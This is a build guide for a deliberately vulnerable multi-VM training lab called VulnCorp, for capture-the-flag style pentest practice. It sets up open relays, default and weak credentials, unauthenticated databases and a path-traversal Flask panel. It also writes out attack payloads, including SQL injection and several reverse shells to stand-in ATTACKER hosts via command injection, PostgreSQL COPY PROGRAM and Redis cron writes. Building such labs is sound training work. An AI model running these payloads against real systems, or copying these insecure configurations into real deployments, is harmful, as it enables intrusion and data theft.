# 🔧 VulnCorp Enterprise Testbed — Step-by-Step Build Guide

> **Reference:** See `masterplan.md` for the full architecture and vulnerability list.
> **Prerequisite Knowledge:** Basic Linux, VirtualBox, and networking concepts.
> **Approach:** Each of the 11 lab machines is a **dedicated VirtualBox VM** running its own
> OS ISO (Debian 13 or Ubuntu 24). Services are installed natively — no Docker inside the VMs.

---

## 📋 Table of Contents

1. [VM Overview — All 11 Machines](#1-vm-overview--all-11-machines)
2. [VirtualBox Network Setup](#2-virtualbox-network-setup)
3. [ISO Downloads & Common Install Settings](#3-iso-downloads--common-install-settings)
4. [Machine 1 — dmz-web01 (Web Server)](#4-machine-1--dmz-web01-web-server)
5. [Machine 2 — dmz-mail01 (Mail Server)](#5-machine-2--dmz-mail01-mail-server)
6. [Machine 3 — dmz-ftp01 (FTP Server)](#6-machine-3--dmz-ftp01-ftp-server)
7. [Machine 4 — rz-db01 (Database Server)](#7-machine-4--rz-db01-database-server)
8. [Machine 5 — rz-vpn01 (VPN Concentrator)](#8-machine-5--rz-vpn01-vpn-concentrator)
9. [Machine 6 — rz-monitor01 (Monitoring Server)](#9-machine-6--rz-monitor01-monitoring-server)
10. [Machine 7 — int-dc01 (Domain Controller)](#10-machine-7--int-dc01-domain-controller)
11. [Machine 8 — int-erp01 (ERP Server)](#11-machine-8--int-erp01-erp-server)
12. [Machine 9 — int-dev01 (DevOps Server)](#12-machine-9--int-dev01-devops-server)
13. [Machine 10 — int-files01 (File Server)](#13-machine-10--int-files01-file-server)
14. [Machine 11 — int-backup01 (Backup Server)](#14-machine-11--int-backup01-backup-server)
15. [Inter-Zone Routing](#15-inter-zone-routing)
16. [CTFd Scoreboard Setup](#16-ctfd-scoreboard-setup)
17. [Firewall Rules](#17-firewall-rules)
18. [Testing Your Lab](#18-testing-your-lab)

---

## 1. VM Overview — All 12 Machines

| # | VM Name | Hostname | Zone | OS | RAM | Disk | vCPUs | Static IP |
|---|---------|----------|------|----|-----|------|-------|-----------|
| 1 | dmz-web01 | vulncorp-web01 | DMZ | **Debian 13** | 1 GB | 20 GB | 1 | 10.10.10.10 |
| 2 | dmz-mail01 | vulncorp-mail01 | DMZ | **Debian 13** | 1 GB | 20 GB | 1 | 10.10.10.20 |
| 3 | dmz-ftp01 | vulncorp-ftp01 | DMZ | **Debian 13** | 1 GB | 20 GB | 1 | 10.10.10.30 |
| 4 | rz-db01 | vulncorp-db01 | Restricted | **Ubuntu 24** | 2 GB | 30 GB | 2 | 172.16.0.10 |
| 5 | rz-vpn01 | vulncorp-vpn01 | Restricted | **Ubuntu 24** | 1 GB | 20 GB | 1 | 172.16.0.20 |
| 6 | rz-monitor01 | vulncorp-monitor01 | Restricted | **Debian 13** | 1 GB | 20 GB | 1 | 172.16.0.30 |
| 7 | int-dc01 | VULNCORP-DC01 | Internal | **Windows Server 2019** | 4 GB | 60 GB | 2 | 192.168.1.10 |
| 8 | int-erp01 | vulncorp-erp01 | Internal | **Ubuntu 24** | 2 GB | 25 GB | 2 | 192.168.1.20 |
| 9 | int-dev01 | vulncorp-dev01 | Internal | **Ubuntu 24** | 3 GB | 40 GB | 2 | 192.168.1.30 |
| 10 | int-files01 | VULNCORP-FILES01 | Internal | **Debian 13** | 1 GB | 20 GB | 1 | 192.168.1.40 |
| 11 | int-backup01 | vulncorp-backup01 | Internal | **Debian 13** | 1 GB | 20 GB | 1 | 192.168.1.50 |
| 12 | int-ws01 | VULNCORP-WS01 | Internal | **Windows 10 Enterprise** | 2 GB | 40 GB | 2 | 192.168.1.60 |

**OS Summary:**
- **Debian 13 VMs:** 6 — (web01, mail01, ftp01, monitor01, files01, backup01)
- **Ubuntu 24 VMs:** 4 — (db01, vpn01, erp01, dev01)
- **Windows Server 2019:** 1 — (dc01)
- **Windows 10 Enterprise:** 1 — (ws01)

**Host machine requirements (to run all 11 VMs):**

| Resource | Minimum | Recommended |
|----------|---------|-------------|
| RAM | 18 GB | 32 GB |
| Disk | 300 GB | 500 GB |
| CPU Cores | 8 | 16 |

> **Tip:** You do NOT need all 11 VMs running simultaneously. Run only the zone you are
> actively attacking. Take VirtualBox snapshots after each machine is configured so you
> can restore quickly.

---

## 2. VirtualBox Network Setup

Create **3 isolated Host-Only networks** in VirtualBox — one per zone.
These networks exist only inside your PC and keep zones separated from each other.

### 2.1 Create Host-Only Networks

**VirtualBox → File → Tools → Network Manager → Host-only Networks tab**

Create 3 networks with the following settings (disable DHCP on all of them):

| Network | Adapter IP (Gateway) | Subnet Mask | Zone |
|---------|---------------------|-------------|------|
| `vboxnet0` | `10.10.10.1` | `255.255.255.0` | DMZ |
| `vboxnet1` | `172.16.0.1` | `255.255.255.0` | Restricted |
| `vboxnet2` | `192.168.1.1` | `255.255.255.0` | Internal |

### 2.2 Adapter Rules for Each VM

When creating each VM:
- **Adapter 1:** Host-only Adapter → assign the correct `vboxnet` for that VM's zone
- **Adapter 2 (during setup only):** NAT → gives internet access for `apt install`

  Remove Adapter 2 after all packages are installed, for lab realism.

### 2.3 Zone-to-vboxnet Mapping

| Zone | vboxnet | VMs in this zone |
|------|---------|-----------------|
| DMZ | `vboxnet0` | web01, mail01, ftp01 |
| Restricted | `vboxnet1` | db01, vpn01, monitor01 |
| Internal | `vboxnet2` | dc01, erp01, dev01, files01, backup01 |

---

## 3. ISO Downloads & Common Install Settings

### 3.1 ISO Downloads

| OS | URL | Filename |
|----|-----|----------|
| Debian 13 (Bookworm) | https://www.debian.org/download | `debian-13.x-amd64-netinst.iso` |
| Ubuntu 24.04 LTS Server | https://ubuntu.com/download/server | `ubuntu-24.04-live-server-amd64.iso` |
| **Windows Server 2019 Eval** (for int-dc01) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019 | `WS2019_Eval.iso` (~5 GB, 180-day eval) |
| **Windows 10 Enterprise Eval** (for int-ws01) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise | `Windows10_Enterprise_eval.iso` (~5 GB, 90-day eval) |
| VirtualBox (hypervisor for both Windows VMs) | https://www.virtualbox.org/wiki/Downloads | `VirtualBox-7.x-Win.exe` |

### 3.2 Debian 13 Install Settings (applies to all 6 Debian VMs)

During the Debian installer:
- **Hostname:** set per-machine (from the table in Section 1)
- **Domain:** `vulncorp.local`
- **Root password:** `toor`
- **New user:** `labadmin` / password: `labadmin123`
- **Partitioning:** Guided — use entire disk
- **Software selection:** ✅ SSH server ✅ Standard system utilities — nothing else
- **Grub:** Install to primary drive

After first boot:
```bash
su -
usermod -aG sudo labadmin
apt update && apt upgrade -y
# If you need internet during setup, ensure Adapter 2 (NAT) is enabled in VirtualBox
```

### 3.3 Ubuntu 24 Install Settings (applies to all 4 Ubuntu VMs)

During the Ubuntu installer:
- **Hostname:** set per-machine
- **Username:** `labadmin` / password: `labadmin123`
- **Storage:** Use entire disk
- **OpenSSH:** ✅ Install OpenSSH server
- **Featured snaps:** Skip all
- **Updates:** No automatic updates

After first boot:
```bash
sudo apt update && sudo apt upgrade -y
```

### 3.4 Static IP — Debian 13

Edit `/etc/network/interfaces` on every Debian VM:

```bash
sudo nano /etc/network/interfaces
```

Replace the `enp0s3` section with:
```
auto enp0s3
iface enp0s3 inet static
    address <IP_FROM_TABLE>
    netmask 255.255.255.0
    gateway <ZONE_GATEWAY>
```

Then apply:
```bash
sudo systemctl restart networking
```

### 3.5 Static IP — Ubuntu 24

Edit the Netplan config on every Ubuntu VM:

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: false
      addresses:
        - <IP_FROM_TABLE>/24
      routes:
        - to: default
          via: <ZONE_GATEWAY>
      nameservers:
        addresses: [8.8.8.8]
```

```bash
sudo netplan apply
```

---

## 4. Machine 1 — dmz-web01 (Web Server)

> ✅ **Codebase Status:** ALREADY BUILT in this workspace (`webserver/`).  
> Reference: See `README.md` for the full attack chain (SQLi, Command Injection, File Upload, SUID, Cron, Lateral Movement).

**OS:** Debian 13 | **IP:** 10.10.10.10 | **Zone:** DMZ  
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet0`

**Services:** Flask Web App (Port 80/8080) · OpenSSH (Port 22/2222) · vsftpd FTP (Port 21/2121) · Root Cron Job

---

### 4.1 Set Static IP on Debian 13

Edit `/etc/network/interfaces`:
```
auto enp0s3
iface enp0s3 inet static
    address 10.10.10.10
    netmask 255.255.255.0
    gateway 10.10.10.1
```
```bash
sudo systemctl restart networking
```

---

### 4.2 Install Base System Packages

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv \
    openssh-server vsftpd cron sudo curl wget nmap \
    net-tools iputils-ping vim nano gcc make sqlite3
```

---

### 4.3 Create Lab Users

```bash
# webuser: runs the Flask web application (initial shell target)
# backup: has sudo misconfiguration (GTFOBins vim)
sudo useradd -m -s /bin/bash webuser && echo "webuser:webuser123" | sudo chpasswd
sudo useradd -m -s /bin/bash backup && echo "backup:backup2024" | sudo chpasswd
```

---

### 4.4 Deploy Existing Web Server Codebase

Copy this `webserver` folder to `/opt/vulncorp` on the VM:

```bash
# On the VM:
sudo mkdir -p /opt/vulncorp/app /opt/vulncorp/db /opt/vulncorp/setup
sudo chown -R webuser:webuser /opt/vulncorp

# Create Python virtual environment and install dependencies
sudo python3 -m venv /opt/venv
sudo /opt/venv/bin/pip install --no-cache-dir flask

# Copy app files into place
sudo cp -r app/* /opt/vulncorp/app/
sudo mkdir -p /opt/vulncorp/app/uploads /opt/vulncorp/app/static/docs
sudo chown -R webuser:webuser /opt/vulncorp
```

---

### 4.5 Run Privilege Escalation & Service Setup Scripts

The pre-built setup scripts in `setup/` configure all intentional vulnerabilities:

```bash
# Make setup scripts executable and run them
sudo cp -r setup/* /opt/setup/
sudo chmod +x /opt/setup/*.sh

# 1. Setup SUID vuln-backup, writable cron (/opt/scripts/cleanup.sh), sudo rights (find/vim), 644 shadow
sudo /opt/setup/setup_privesc.sh

# 2. Setup SSH weak config & vsftpd anonymous access with network map
sudo /opt/setup/setup_services.sh

# 3. Plant lateral movement breadcrumbs (notes.txt, SSH keys for db01, database.yml, flags)
sudo /opt/setup/setup_breadcrumbs.sh
```

---

### 4.6 Configure Flask App as a Systemd Service

Create `/etc/systemd/system/vulncorp-web.service`:

```bash
sudo tee /etc/systemd/system/vulncorp-web.service << 'EOF'
[Unit]
Description=VulnCorp Vulnerable Flask Web Application
After=network.target

[Service]
Type=simple
User=webuser
WorkingDirectory=/opt/vulncorp/app
ExecStart=/opt/venv/bin/python3 /opt/vulncorp/app/app.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now vulncorp-web
sudo systemctl enable --now ssh vsftpd cron
```

---

### 4.7 Alternative: One-Command / Docker Deploy

You can also deploy directly using the existing scripts in the folder:

```bash
# Option A: Run automated deployment script on the machine
chmod +x deploy.sh
sudo ./deploy.sh

# Option B: Run via Docker Compose
docker compose up -d --build
```

---

### 4.8 Attack Surface & Verification (from `README.md`)

```bash
# Verify services are up
curl http://10.10.10.10:80/
ftp 10.10.10.10 21

# Initial Access Vectors:
# 1. SQL Injection on /login: admin' OR '1'='1' --
# 2. Command Injection on /nettools: 127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
# 3. File Upload on /upload: Upload webshell -> execute via /cgi/shell.sh
# 4. Directory Traversal on /viewer?file=../../../etc/shadow

# Privilege Escalation Vectors:
# 1. SUID: /usr/local/bin/vuln-backup (PATH hijack)
# 2. Writable Cron: /opt/scripts/cleanup.sh (runs every min as root)
# 3. Sudo: sudo /usr/bin/find /tmp -exec /bin/bash \;

# Lateral Movement:
# 1. Read /opt/vulncorp/config/database.yml and /root/notes.txt for Machine 2 (db01: 172.16.0.10) creds
# 2. Read /var/ftp/pub/network_map.txt for full network topology
```
```

---

## 5. Machine 2 — dmz-mail01 (Mail Server)

**OS:** Debian 13 | **IP:** 10.10.10.20 | **Zone:** DMZ
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet0`

**Goal:** Postfix SMTP open relay + Dovecot plaintext auth + Roundcube webmail with credential breadcrumbs.

### 5.1 Set Static IP

```
address 10.10.10.20
netmask 255.255.255.0
gateway 10.10.10.1
```

### 5.2 Install Services

```bash
sudo apt update
sudo DEBIAN_FRONTEND=noninteractive apt install -y \
  postfix dovecot-core dovecot-imapd dovecot-pop3d \
  roundcube roundcube-core roundcube-sqlite3 \
  apache2 libapache2-mod-php php sqlite3 \
  openssh-server curl wget net-tools vim sudo
# When postfix installer asks: select "Internet Site"
# System mail name: vulncorp.local
```

### 5.3 Configure Postfix (Open Relay — intentional)

```bash
sudo tee /etc/postfix/main.cf << 'EOF'
myhostname = mail.vulncorp.local
mydomain = vulncorp.local
myorigin = $mydomain
inet_interfaces = all
inet_protocols = ipv4
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain

# OPEN RELAY — intentional vulnerability (no relay restrictions)
mynetworks = 0.0.0.0/0
relay_domains = *

home_mailbox = Maildir/
smtpd_banner = $myhostname ESMTP Postfix (Debian/GNU)

# Disable TLS (intentional — cleartext)
smtpd_use_tls = no
smtp_use_tls = no

# Allow VRFY/EXPN (user enumeration — intentional)
disable_vrfy_command = no
EOF

sudo systemctl restart postfix
```

### 5.4 Configure Dovecot (Plaintext Auth — intentional)

```bash
sudo tee /etc/dovecot/dovecot.conf << 'EOF'
protocols = imap pop3
listen = *

# Plain text auth — no TLS required (intentional)
disable_plaintext_auth = no
auth_mechanisms = plain login

mail_location = maildir:~/Maildir

passdb {
  driver = pam
}

userdb {
  driver = passwd
}

service imap-login {
  inet_listener imap {
    port = 143
  }
}

service auth {
  unix_listener /var/spool/postfix/private/auth {
    mode = 0666
  }
}
EOF

sudo systemctl restart dovecot
```

### 5.5 Create Mail Users (weak passwords — intentional)

```bash
sudo useradd -m -s /bin/bash admin
sudo useradd -m -s /bin/bash sysadmin
sudo useradd -m -s /bin/bash developer
sudo useradd -m -s /bin/bash helpdesk

echo "admin:Admin@2024!" | sudo chpasswd
echo "sysadmin:Sysadmin#99" | sudo chpasswd
echo "developer:dev123" | sudo chpasswd
echo "helpdesk:Helpdesk@123" | sudo chpasswd

# Create Maildir structure for each user
for user in admin sysadmin developer helpdesk; do
  sudo mkdir -p /home/$user/Maildir/{cur,new,tmp}
  sudo chown -R $user:$user /home/$user/Maildir
done
```

### 5.6 Plant Breadcrumb Emails

```bash
# VPN credentials email (breadcrumb for attackers)
sudo tee /home/admin/Maildir/new/vpn_creds << 'EOF'
From: sysadmin@vulncorp.local
To: admin@vulncorp.local
Subject: VPN Access Details
Date: Mon, 01 Sep 2026 09:00:00 +0530

Hi Admin,

VPN Server: 172.16.0.20
Username: vpnadmin
Password: Sysadmin#99
Port: 8443 (Web Admin)

Keep this confidential.

Best,
Sysadmin
EOF
sudo chown admin:admin /home/admin/Maildir/new/vpn_creds

# DB credentials email
sudo tee /home/sysadmin/Maildir/new/db_creds << 'EOF'
From: dbadmin@vulncorp.local
To: sysadmin@vulncorp.local
Subject: Production DB Credentials - Confidential

MySQL Host: 172.16.0.10
User: root
Password: toor

Redis: same host, no password set.

DO NOT share this email.
DBAdmin
EOF
sudo chown sysadmin:sysadmin /home/sysadmin/Maildir/new/db_creds
```

### 5.7 SSH Config (root login + password auth — intentional)

```bash
sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh
```

### 5.8 Plant Flags

```bash
echo "VULN{m41l_ph1sh_cr3ds}" | sudo tee /home/admin/flag.txt
echo "VULN{m41l_s3rv3r_0wn3d_m4ch1n3_2}" | sudo tee /root/root.txt
```

### 5.9 Enable and Start All Services

```bash
sudo systemctl enable postfix dovecot apache2 ssh
sudo systemctl start postfix dovecot apache2 ssh
```

### 5.10 Test Mail Vulnerabilities

```bash
# Test SMTP open relay
telnet 10.10.10.20 25
# HELO attacker.com
# MAIL FROM: <hacker@attacker.com>
# RCPT TO: <anyone@anywhere.com>   ← should accept on open relay

# Test VRFY user enumeration
# VRFY admin
# VRFY sysadmin
```

---

## 6. Machine 3 — dmz-ftp01 (FTP Server)

**OS:** Debian 13 | **IP:** 10.10.10.30 | **Zone:** DMZ
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet0`

**Goal:** vsftpd anonymous write + ProFTPD mod_copy RCE + sensitive files in pub share.

### 6.1 Set Static IP

```
address 10.10.10.30
netmask 255.255.255.0
gateway 10.10.10.1
```

### 6.2 Install Services

```bash
sudo apt update
sudo apt install -y vsftpd proftpd apache2 openssh-server \
  curl wget net-tools vim sudo
# When proftpd asks: select "standalone" mode
```

### 6.3 Create FTP User

```bash
sudo useradd -m ftpuser && echo "ftpuser:ftp123" | sudo chpasswd
```

### 6.4 Create Sensitive Files (Breadcrumbs in FTP pub)

```bash
sudo mkdir -p /var/ftp/pub/keys
sudo chmod -R 777 /var/ftp/pub

# Network topology map — reveals all internal IPs to attacker
sudo tee /var/ftp/pub/network_map.txt << 'EOF'
VulnCorp Internal Network Map
==============================
DMZ Zone:         10.10.10.0/24
  Web Server:     10.10.10.10
  Mail Server:    10.10.10.20
  FTP Server:     10.10.10.30

Restricted Zone:  172.16.0.0/24
  Database:       172.16.0.10  (MySQL 3306, PostgreSQL 5432, Redis 6379)
  VPN:            172.16.0.20  (OpenVPN 1194, Web Admin 8443)
  Monitoring:     172.16.0.30  (Nagios 80, SNMP 161)

Internal Zone:    192.168.1.0/24
  Domain Ctrl:    192.168.1.10  (AD, LDAP, Kerberos)
  ERP Server:     192.168.1.20
  Dev Server:     192.168.1.30  (GitLab 80, Jenkins 8080)
  File Server:    192.168.1.40  (SMB 445, NFS 2049)
  Backup Server:  192.168.1.50  (Rsync 873)
EOF

# Leaked SSH private key (sysadmin's backup key)
sudo ssh-keygen -t rsa -b 2048 -f /var/ftp/pub/keys/backup_rsa -N "" -C "sysadmin@vulncorp.local"

# Partial DB credentials file
sudo tee /var/ftp/pub/db_credentials.txt << 'EOF'
[REDACTED - PARTIAL BACKUP]
MySQL Production:
  Host: 172.16.0.10
  User: root
  Password: t**r   (see IT team for full creds)

PostgreSQL:
  Host: 172.16.0.10
  Port: 5432
  DB: vulncorp_prod

Redis:
  Host: 172.16.0.10
  Port: 6379
  Auth: (none configured)
EOF

# Employee list for password spraying
sudo tee /var/ftp/pub/employee_list.csv << 'EOF'
FirstName,LastName,Username,Department
John,Doe,john.doe,IT
Jane,Smith,jane.smith,Development
Admin,User,admin,IT
Sys,Admin,sysadmin,IT
Help,Desk,helpdesk,Support
Backup,Agent,svc_backup,IT
EOF
```

### 6.5 Configure vsftpd (Anonymous Write — intentional)

```bash
sudo tee /etc/vsftpd.conf << 'EOF'
# Anonymous login ENABLED — intentional vulnerability
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
write_enable=YES
local_enable=YES
local_umask=022
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES

# No chroot — allows traversal
chroot_local_user=NO

ftpd_banner=VulnCorp FTP Server v2.3.4
anon_root=/var/ftp
listen=YES

# Passive mode
pasv_enable=YES
pasv_min_port=40000
pasv_max_port=40100
EOF
```

### 6.6 Configure ProFTPD with mod_copy (CVE-2015-3306 simulation)

```bash
sudo tee /etc/proftpd/proftpd.conf << 'EOF'
ServerName "VulnCorp ProFTPD"
ServerType standalone
DefaultServer on
Port 2121

# mod_copy — enables SITE CPFR / SITE CPTO
# Allows unauthenticated file copy (CVE-2015-3306 simulation)
LoadModule mod_copy.c

<Anonymous /var/ftp>
  User ftp
  Group nogroup
  RequireValidShell off
  UserAlias anonymous ftp
  <Limit WRITE>
    AllowAll
  </Limit>
</Anonymous>
EOF
```

### 6.7 Plant Flags

```bash
echo "VULN{anon_ftp_wr1t3}" | sudo tee /var/ftp/pub/flag1.txt
echo "VULN{ssh_k3y_l3ak3d}" | sudo tee /var/ftp/pub/keys/flag.txt
echo "VULN{ftp_s3rv3r_r00t3d_m4ch1n3_3}" | sudo tee /root/root.txt
sudo chown ftp:ftp /var/ftp -R
```

### 6.8 SSH Config (allow root — intentional)

```bash
sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh
```

### 6.9 Enable and Start All Services

```bash
sudo systemctl enable vsftpd proftpd apache2 ssh
sudo systemctl start vsftpd proftpd apache2 ssh
```

### 6.10 Test FTP

```bash
ftp 10.10.10.30
# Username: anonymous
# Password: <blank>
# ls pub/    → should show network_map.txt, db_credentials.txt, etc.
```

---

## 7. Machine 4 — rz-db01 (Database Server)

**OS:** Ubuntu 24 | **IP:** 172.16.0.10 | **Zone:** Restricted
**VirtualBox:** RAM 2048 MB · vCPUs 2 · Disk 30 GB · Adapter 1: `vboxnet1`

**Goal:** MySQL 8 + PostgreSQL 16 + Redis — all with intentional misconfigurations enabling data exfil and RCE.

### 7.1 Set Static IP (Netplan)

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```
```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: false
      addresses:
        - 172.16.0.10/24
      routes:
        - to: default
          via: 172.16.0.1
      nameservers:
        addresses: [8.8.8.8]
```
```bash
sudo netplan apply
```

### 7.2 Install Services

```bash
sudo apt update
sudo apt install -y mysql-server postgresql postgresql-contrib \
  redis-server openssh-server python3 python3-pip curl wget net-tools vim sudo
```

### 7.3 Configure MySQL (root/toor + bind all — intentional)

```bash
# Set root password to 'toor'
sudo mysql << 'EOF'
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'toor';
CREATE USER IF NOT EXISTS 'root'@'%' IDENTIFIED WITH mysql_native_password BY 'toor';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF

# Bind MySQL to all interfaces
sudo sed -i 's/^bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf
sudo systemctl restart mysql
```

### 7.4 Load PII Data and Credential Tables

```bash
sudo mysql -u root -ptoor << 'EOF'
CREATE DATABASE IF NOT EXISTS vulncorp_prod;
CREATE DATABASE IF NOT EXISTS vulncorp_hr;
CREATE DATABASE IF NOT EXISTS vulncorp_auth;

USE vulncorp_prod;

-- Employee table with PII (SSN, salary — intentional data exposure)
CREATE TABLE IF NOT EXISTS employees (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50), full_name VARCHAR(100),
  email VARCHAR(100), department VARCHAR(50),
  salary DECIMAL(10,2), ssn VARCHAR(20), phone VARCHAR(20)
);
INSERT INTO employees VALUES
(1,'john.doe','John Doe','john.doe@vulncorp.local','IT',95000.00,'123-45-6789','555-0101'),
(2,'jane.smith','Jane Smith','jane.smith@vulncorp.local','Development',88000.00,'234-56-7890','555-0102'),
(3,'admin','Admin User','admin@vulncorp.local','IT',110000.00,'345-67-8901','555-0103'),
(4,'sysadmin','Sys Admin','sysadmin@vulncorp.local','IT',120000.00,'456-78-9012','555-0104'),
(5,'helpdesk','Help Desk','helpdesk@vulncorp.local','Support',55000.00,'567-89-0123','555-0105');

-- Internal credentials table — lateral movement breadcrumb
CREATE TABLE IF NOT EXISTS internal_credentials (
  id INT AUTO_INCREMENT PRIMARY KEY,
  service VARCHAR(50), host VARCHAR(50),
  username VARCHAR(50), password VARCHAR(100), notes TEXT
);
INSERT INTO internal_credentials VALUES
(1,'SSH','192.168.1.10','john.doe','Corp@Admin2024','Domain controller SSH'),
(2,'RDP','192.168.1.10','Administrator','Corp@Admin2024','Windows Admin'),
(3,'MySQL','172.16.0.10','root','toor','Self reference'),
(4,'MSSQL','192.168.1.20','sa','sa','ERP SQL Server'),
(5,'SSH','192.168.1.30','jenkins','jenkins123','Dev server'),
(6,'Rsync','192.168.1.50','backupadmin','backup123','Backup server'),
(7,'GitLab','192.168.1.30','root','gitlab_root_pass','GitLab admin');

-- Flag hidden in database
CREATE TABLE IF NOT EXISTS secret_flags (id INT AUTO_INCREMENT PRIMARY KEY, flag VARCHAR(100));
INSERT INTO secret_flags VALUES
(1,'VULN{mysql_d3fault_cr3ds}'), (2,'VULN{pii_d4t4_3xfil}');

USE vulncorp_auth;
CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50), password_hash VARCHAR(64), role VARCHAR(20)
);
-- MD5 hashes (crackable) — intentional weak hashing
INSERT INTO users VALUES
(1,'admin',MD5('Admin@2024!'),'admin'),
(2,'sysadmin',MD5('Sysadmin#99'),'admin'),
(3,'helpdesk',MD5('Helpdesk@123'),'user'),
(4,'jane.smith',MD5('Jane@Dev2024'),'developer');

FLUSH PRIVILEGES;
EOF
```

### 7.5 Configure PostgreSQL (RCE via COPY PROGRAM — intentional)

```bash
# Create superuser (COPY TO/FROM PROGRAM allows RCE as superuser)
sudo -u postgres psql << 'EOF'
CREATE USER vulncorp_user WITH SUPERUSER PASSWORD 'vulncorp123';
CREATE DATABASE vulncorp_prod OWNER vulncorp_user;
\c vulncorp_prod
CREATE TABLE IF NOT EXISTS pg_flag (id SERIAL PRIMARY KEY, flag TEXT);
INSERT INTO pg_flag VALUES (1, 'VULN{pg_rce_4_th3_w1n}');
-- RCE exploit: COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
EOF

# Allow connections from all hosts (intentional)
echo "host all all 0.0.0.0/0 md5" | sudo tee -a /etc/postgresql/16/main/pg_hba.conf
echo "listen_addresses = '*'" | sudo tee -a /etc/postgresql/16/main/postgresql.conf
sudo systemctl restart postgresql
```

### 7.6 Configure Redis (No Auth, Bind All — intentional)

```bash
sudo sed -i 's/^bind 127.0.0.1.*/bind 0.0.0.0/' /etc/redis/redis.conf
sudo sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf
# requirepass is NOT set — intentional
sudo systemctl restart redis-server
```

### 7.7 Plant Flags

```bash
echo "VULN{pii_d4t4_3xfil}" | sudo tee /tmp/pii_flag.txt
echo "VULN{db_s3rv3r_r00t3d_m4ch1n3_4}" | sudo tee /root/root.txt
```

### 7.8 Enable All Services

```bash
sudo systemctl enable mysql postgresql redis-server ssh
```

### 7.9 Test

```bash
mysql -h 172.16.0.10 -u root -ptoor -e "SHOW DATABASES;"
redis-cli -h 172.16.0.10 ping   # Should return PONG

# Redis RCE via cron
redis-cli -h 172.16.0.10 CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h 172.16.0.10 CONFIG SET dbfilename root
redis-cli -h 172.16.0.10 SET payload "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
redis-cli -h 172.16.0.10 BGSAVE
```

---

## 8. Machine 5 — rz-vpn01 (VPN Concentrator)

**OS:** Ubuntu 24 | **IP:** 172.16.0.20 | **Zone:** Restricted
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet1`

**Goal:** OpenVPN + Flask web admin panel with default creds + path traversal + credential leak in logs.

### 8.1 Set Static IP (Netplan)

```yaml
addresses: [172.16.0.20/24]
routes:
  - to: default
    via: 172.16.0.1
```

### 8.2 Install Services

```bash
sudo apt update
sudo apt install -y openvpn easy-rsa python3 python3-pip python3-flask \
  openssh-server curl wget net-tools sudo vim

# Create vpnadmin user
sudo useradd -m vpnadmin && echo "vpnadmin:vpnadmin123" | sudo chpasswd
sudo usermod -aG sudo vpnadmin

# Sudo misconfiguration — intentional
echo "vpnadmin ALL=(ALL) NOPASSWD: /sbin/openvpn" | sudo tee -a /etc/sudoers
```

### 8.3 Create Flask VPN Admin Panel (Default Creds — intentional)

```bash
sudo mkdir -p /opt/vpn_admin/templates /etc/openvpn/clients

sudo tee /opt/vpn_admin/app.py << 'PYEOF'
from flask import Flask, render_template, request, session, redirect, send_file
import os

app = Flask(__name__)
app.secret_key = "vulncorp_vpn_secret_2024"

# DEFAULT CREDENTIALS — intentional vulnerability
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
VPN_CONFIGS = "/etc/openvpn/clients"

@app.route("/")
def index():
    if "user" in session:
        return redirect("/dashboard")
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    u = request.form.get("username")
    p = request.form.get("password")
    if u == ADMIN_USER and p == ADMIN_PASS:
        session["user"] = u
        return redirect("/dashboard")
    return render_template("login.html", error="Invalid credentials")

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/")
    configs = os.listdir(VPN_CONFIGS) if os.path.exists(VPN_CONFIGS) else []
    return render_template("dashboard.html", configs=configs)

@app.route("/download/<filename>")
def download(filename):
    if "user" not in session:
        return redirect("/")
    # Path traversal vulnerability — no sanitization (intentional)
    filepath = os.path.join(VPN_CONFIGS, filename)
    return send_file(filepath, as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8443)
PYEOF

# Basic HTML templates
sudo tee /opt/vpn_admin/templates/login.html << 'EOF'
<!DOCTYPE html><html><head><title>VulnCorp VPN Admin</title></head>
<body><h2>VPN Admin Panel</h2>
{% if error %}<p style="color:red">{{ error }}</p>{% endif %}
<form method="POST" action="/login">
  Username: <input name="username"><br>
  Password: <input name="password" type="password"><br>
  <input type="submit" value="Login">
</form></body></html>
EOF

sudo tee /opt/vpn_admin/templates/dashboard.html << 'EOF'
